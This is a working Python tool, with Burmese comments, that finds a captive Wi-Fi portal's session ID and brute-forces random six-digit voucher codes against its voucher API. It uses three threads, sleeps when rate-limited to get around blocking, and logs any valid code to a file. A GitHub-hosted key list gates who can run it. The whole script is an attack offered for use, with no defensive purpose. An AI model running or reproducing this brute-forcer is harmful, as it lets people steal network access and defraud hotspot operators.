#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import hashlib
from urllib.parse import urlparse, parse_qs

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# UI COLORS
# ===============================
RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[97m", "\033[0m"

# ===============================
# CONFIGURATION
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
KEY_FILE = os.path.expanduser("~/.moe_yu_key")

def get_device_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as f: return f.read().strip()
    key = hashlib.md5(os.urandom(32)).hexdigest()[:16]
    with open(KEY_FILE, 'w') as f: f.write(key)
    return key

def check_license():
    my_key = get_device_key()
    print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
    print(f"║      MOE YU AUTO VOUCHER SCANNER v3.1 FIXED      ║")
    print(f"╚══════════════════════════════════════════════════╝{RESET}")
    print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
    try:
        res = requests.get(GITHUB_KEY_URL, timeout=10).text
        if my_key in res:
            print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
            return True
        else:
            print(f"{RED}[✗] ACCESS DENIED - Add key to GitHub{RESET}")
            return False
    except:
        return True

# ===============================
# SCANNER ENGINE
# ===============================
FOUND_EVENT = threading.Event()

def attempt_voucher(api_url, sid, thread_id):
    while not FOUND_EVENT.is_set():
        test_code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        payload = {'accessCode': test_code, 'sessionId': sid, 'apiVersion': 1}
        try:
            r = requests.post(api_url, json=payload, timeout=5, verify=False)
            if r.status_code == 200:
                result = r.json()
                if result.get('success'):
                    FOUND_EVENT.set()
                    print(f"\n\n{GREEN}[++++++++++] VOUCHER FOUND: {test_code} [++++++++++]{RESET}")
                    # မှတ်သားထားရန်
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"Code: {test_code} | SID: {sid}\n")
                    break
                print(f"{WHITE}Thread-{thread_id} | Testing: {YELLOW}{test_code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
            elif r.status_code in [403, 429]:
                time.sleep(20)
        except:
            pass
        time.sleep(0.05)

def start_scanner(portal_url, sid):
    parsed = urlparse(portal_url)
    api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
    
    print(f"\n{CYAN}[*] Target API: {api_url}{RESET}")
    print(f"{GREEN}[✓] Starting Scan Automatically...{RESET}\n")

    # Thread ၃ ခုဖြင့် အလုပ်လုပ်ခိုင်းခြင်း
    for i in range(1, 4):
        t = threading.Thread(target=attempt_voucher, args=(api_url, sid, i))
        t.daemon = True
        t.start()

    while not FOUND_EVENT.is_set():
        time.sleep(1)

# ===============================
# MAIN PROCESS
# ===============================
def main():
    if not check_license(): return
    
    print(f"\n{CYAN}[*] Waiting for Portal (Please open Browser)...{RESET}")
    while True:
        try:
            r = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
            portal_url = r.url
            
            # URL ထဲမှာ SID မပါရင် Manual ထည့်ခိုင်းမယ်
            if "sessionId=" not in portal_url:
                portal_url = input(f"{YELLOW}[!] SID မတွေ့ပါ။ Browser URL ကို ဒီမှာ ကူးထည့်ပါ: {RESET}").strip()
            
            if "sessionId=" in portal_url:
                sid = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
                if sid:
                    print(f"{GREEN}[✓] Portal & SID Detected!{RESET}")
                    # y/n မမေးတော့ဘဲ တန်းစတင်ပါပြီ
                    start_scanner(portal_url, sid)
                    break
            
            time.sleep(3)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(2)

if __name__ == "__main__":
    main()
